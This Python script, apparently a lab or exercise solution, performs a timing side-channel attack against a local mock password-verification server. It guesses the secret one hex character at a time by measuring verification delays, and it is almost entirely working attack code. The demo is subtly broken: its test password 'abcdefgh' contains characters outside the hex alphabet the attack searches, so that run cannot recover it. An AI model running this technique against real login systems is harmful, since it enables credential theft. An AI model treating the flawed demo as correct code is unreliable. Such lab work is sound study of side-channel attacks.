import bad_server
import api
import secrets
from typing import Optional
import time

class Client:
    def __init__(self, remote: bad_server.BadServer):
        self._remote = remote

    def verify_time(self, pwd):
        req = api.VerifyRequest(pwd)
        start = time.perf_counter()
        for _ in range(9):
            self._remote.verify_password(req)
        end = time.perf_counter()
        duration = end - start
        return duration

    # for each char choice, get its verified time 
    # get the best verified time (max time) out of all the chars
    # count the number of times it was the best char 
    # append to pwd
    def steal_password_once(self, l: int) -> Optional[str]: # steal the secret pwd from server
        password = ""
        char_choices = "0123456789abcdfe"
        while len(password) < l*2: # one byte for two char
            counter = {}
            for _ in range(60):
                all_verified_times = {}
                for choice in char_choices:
                    verified_times = []
                    # get time it took to verify char
                    for _ in range(50):
                        verified_time = self.verify_time(password + choice)
                        verified_times.append(verified_time)
                    verified_time = min(verified_times) # verified time for one char choice
                    all_verified_times[choice] = verified_time

                best_verified_time_char = max(zip(all_verified_times.values(), all_verified_times.keys()))[1] 
                
                # after checking each choice, increment the number of times the max_time_char was the best char
                if best_verified_time_char not in counter:
                    counter[best_verified_time_char] = 1
                else:
                    counter[best_verified_time_char] += 1  

            # print("\ncounter: ", counter)
            most_likely_char = max(zip(counter.values(), counter.keys()))[1]    
            password += most_likely_char
            # print("curr pwd: ", password)
        return password
        
    def steal_password(self, l: int) -> Optional[str]: # steal the secret pwd from server
        # l = length in bytes of the pwd 
        for _ in range(1000):
            password = self.steal_password_once(l)
            req = api.VerifyRequest(password)
            if self._remote.verify_password(req).ret:
                return password
            else:
                continue
        return None

if __name__ == "__main__":
    # passwd = '37a4e5bf847630173da7e6d19991bb8d'
    passwd = 'abcdefgh'
    nbytes = len(passwd) // 2
    server = bad_server.BadServer(passwd)
    alice = Client(server)
    print(alice.steal_password(nbytes))
    # print(alice.steal_secret_token(nbytes))

